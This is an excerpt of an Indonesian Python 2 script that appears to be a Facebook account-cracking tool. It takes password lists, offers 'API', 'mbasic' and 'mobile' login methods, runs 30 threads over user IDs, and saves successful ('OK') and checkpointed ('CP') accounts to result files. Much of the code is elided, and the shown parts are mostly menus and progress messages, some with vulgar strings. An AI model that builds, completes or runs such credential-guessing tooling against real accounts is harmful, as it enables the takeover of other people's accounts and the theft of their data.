...
logo = ''' \033[0;96m __  __        __  ______  ____
 \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By RedCyber
 \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/BekasiCyber
 \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| Pesan= Jan Salah gunakan'''
...
def moch_yayan():
    ...
    try:
        ...
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');RelGans()
...
'''
																																																				csy = 'Liaa sayang Zarel'
																																																				ysc = 'Zarel sayang Liaa'
																																																			'''
...
def info_tools():
    ...
    print '\n %s[%s>%s] Author   : RedCyber ./RelGans.'%(N,H,N);time.sleep(0.07)
    ...
    print '\n %s[%s>%s] Instagram: https://www.instagram.com/dzarel_16'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Website  : Lagi Di buat ngentot:v'%(N,H,N);time.sleep(0.07)
...
class __crack__:
        ...
        if ___yayanganteng___ in ('Y', 'y'):
            ...
            while True:
                ...
                if pwek == '':
                    ...
                    __yan__(pwek.split(','))
                    break
        elif ___Zarelganteng___ in ('T', 't'):
            print '\n [ pilih method login - silahkan coba satu² ]\n'
            print ' [%s1%s]. method API (fast)'%(O,N)
            print ' [%s2%s]. method mbasic (slow)'%(O,N)
            print ' [%s3%s]. method mobile (super slow)'%(O,N)
    ...
    def __pler__(self):
        ...
        if yan == '':
            ...
            print '\n [%s+%s] hasil OK disimpan8 ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            ...
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__RelGans__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        name, uid = yntkts.split('<=>')
                        xz = name.split(' ')
